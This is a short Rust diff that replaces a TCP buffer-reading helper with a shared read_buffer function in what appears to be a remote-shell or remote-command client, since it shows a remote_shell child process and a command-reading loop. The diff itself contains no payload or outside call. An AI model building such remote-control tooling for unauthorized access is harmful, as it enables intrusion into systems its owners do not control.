@@ -11,7 +11,9 @@ pub mod handler;
 pub mod service;
 pub mod settings;
 
-use handler::{handle_command, read_buffer_tcp};
+use handler::handle_command;
+use common::buffers::read_buffer;
+
 
 fn handle_server(mut read_stream: TcpStream, mut write_stream: TcpStream, is_connected: Arc<Mutex<bool>>) {
     let mut remote_shell: Option<Child> = None;
@@ -19,7 +21,7 @@ fn handle_server(mut read_stream: TcpStream, mut write_stream: TcpStream, is_con
     let mut current_path = PathBuf::new();
 
     loop {
-        let received = read_buffer_tcp(&mut read_stream);
+        let received = read_buffer(&mut read_stream);
         match received {
             Ok(bytes) => {
                 let command_str = String::from_utf8_lossy(&bytes);
